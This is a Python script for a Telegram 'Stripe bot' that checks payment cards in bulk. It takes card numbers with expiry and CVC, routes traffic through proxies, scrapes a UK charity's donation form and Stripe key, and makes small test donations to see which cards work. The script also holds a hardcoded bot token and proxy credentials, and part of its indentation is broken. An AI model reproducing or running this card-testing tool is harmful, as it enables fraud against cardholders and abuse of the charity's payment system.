import requests,random,string,re,os,json,time,uuid
from bs4 import BeautifulSoup

def toc_gate(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]

	if "20" in yy:
		yy = yy.split("20")[1]

	s = requests.session()

	email='urmsb@hi2.in'

	proxies_list = [
    "http://tickets:proxyon145@196.196.23.45:12345",
    "http://152.32.132.190:7890",
    "http://190.93.224.32:999"
]

	proxy = random.choice(proxies_list)

	s.proxies = {
    "http": proxy,
    "https": proxy
}

	headers = {
            'authority': 'www.foursquare.org.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0',
        }

	response = s.get(
        'https://www.foursquare.org.uk/donate/',
        headers=headers
    )
try:
	post = re.search(r'name="post_id"\s+value="([^"]+)"', response.text).group(1)
	form = re.search(r'name="form_id"\s+value="([^"]+)"', response.text).group(1)
	refer = re.search(r'name="referer_title"\s+value="([^"]+)"', response.text).group(1)
	queried = re.search(r'name="queried_id"\s+value="([^"]+)"', response.text).group(1)
	char_form = re.search(r'name="charitable_form_id"\s+value="([^"]+)"', response.text).group(1)
	nonce = re.search(r'name="_charitable_donation_nonce"\s+value="([^"]+)"', response.text).group(1)
	camp = re.search(r'name="campaign_id"\s+value="([^"]+)"', response.text).group(1)
	pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text).group(1)

except:
    return "Proxy dead or site changed"

	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0',
        }

	data = {
            'type': 'card',
            'billing_details[name]': 'test',
            'billing_details[email]': email,
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js',
            'referrer': 'https://www.foursquare.org.uk',
            'time_on_page': '1000',
            'key': pk_live2,
        }

	response = s.post(
        'https://api.stripe.com/v1/payment_methods',
        headers=headers,
        data=data
    )

	try:
		pm = response.json()['id']
	except:
		return "Card Error"

	headers = {
            'authority': 'www.foursquare.org.uk',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.foursquare.org.uk',
            'referer': 'https://www.foursquare.org.uk/donate/',
            'user-agent': 'Mozilla/5.0',
        }

	data = {
            'charitable_form_id': char_form,
            f'{char_form}': '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': camp,
            'description': 'Donation',
            'gateway': 'stripe',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'test',
            'last_name': 'test',
            'email': email,
            'stripe_payment_method': pm,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }

	response = s.post(
        'https://www.foursquare.org.uk/wp-admin/admin-ajax.php',
        headers=headers,
        data=data
    )

	response_text = response.text

	if 'succeeded' in response_text:
		return "Charge ✅"

	elif 'Your card was declined.' in response_text:
		return "Declined ❌"

	elif 'Your card number is incorrect.' in response_text:
		return "Incorrect Number ❌"

	else:
		return response_text[:100]


# ================= TELEGRAM BOT =================

import telebot
from telebot import types

BOT_TOKEN = "8814945212:AAGFnRBqkSQSdiuMiPieLFH2BDbEocJUDhc"

bot = telebot.TeleBot(BOT_TOKEN)

users = {}

# START
@bot.message_handler(commands=['start'])
def start(message):

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)

    btn1 = types.KeyboardButton("💳 CHECK")
    btn2 = types.KeyboardButton("📦 MASS")
    btn3 = types.KeyboardButton("📁 TXT")

    markup.add(btn1)
    markup.add(btn2)
    markup.add(btn3)

    bot.send_message(
        message.chat.id,
        """
╔══════════════╗
║ STRIPE BOT ║
╚══════════════╝

اختر طريقة الفحص 👇
""",
        reply_markup=markup
    )

# SINGLE CHECK
@bot.message_handler(func=lambda m: m.text == "💳 CHECK")
def single_check(message):

    msg = bot.send_message(
        message.chat.id,
        "ارسل البطاقة:\n\n4111111111111111|12|2027|123"
    )

    bot.register_next_step_handler(msg, process_single)

def process_single(message):

    cc = message.text.strip()

    bot.send_message(message.chat.id, "⏳ Checking...")

    try:

        result = toc_gate(cc)

        bot.send_message(
            message.chat.id,
            f"""
💳 CARD:
`{cc}`

📡 RESULT:
{result}
""",
            parse_mode="Markdown"
        )

    except Exception as e:

        bot.send_message(
            message.chat.id,
            f"ERROR:\n{e}"
        )

# MASS CHECK
@bot.message_handler(func=lambda m: m.text == "📦 MASS")
def mass(message):

    msg = bot.send_message(
        message.chat.id,
        """
ارسل البطاقات هكذا:

4111111111111111|12|2027|123
4111111111111111|12|2027|123
"""
    )

    bot.register_next_step_handler(msg, process_mass)

def process_mass(message):

    cards = message.text.strip().splitlines()

    bot.send_message(
        message.chat.id,
        f"⏳ بدأ فحص {len(cards)} بطاقات"
    )

    for cc in cards:

        cc = cc.strip()

        if not cc:
            continue

        try:

            result = toc_gate(cc)

            bot.send_message(
                message.chat.id,
                f"""
💳 `{cc}`

📡 {result}
""",
                parse_mode="Markdown"
            )

        except Exception as e:

            bot.send_message(
                message.chat.id,
                f"{cc}\nERROR: {e}"
            )

# TXT BUTTON
@bot.message_handler(func=lambda m: m.text == "📁 TXT")
def txt(message):

    users[message.chat.id] = "txt"

    bot.send_message(
        message.chat.id,
        "ارسل ملف txt"
    )

# HANDLE TXT FILE
@bot.message_handler(content_types=['document'])
def handle_file(message):

    if users.get(message.chat.id) != "txt":
        return

    file_info = bot.get_file(message.document.file_id)

    downloaded_file = bot.download_file(file_info.file_path)

    text = downloaded_file.decode("utf-8")

    cards = text.splitlines()

    bot.send_message(
        message.chat.id,
        f"⏳ بدأ فحص {len(cards)} بطاقات"
    )

    for cc in cards:

        cc = cc.strip()

        if not cc:
            continue

        try:

            result = toc_gate(cc)

            bot.send_message(
                message.chat.id,
                f"""
💳 `{cc}`

📡 {result}
""",
                parse_mode="Markdown"
            )

        except Exception as e:

            bot.send_message(
                message.chat.id,
                f"{cc}\nERROR: {e}"
            )

print("BOT STARTED")

bot.infinity_polling()
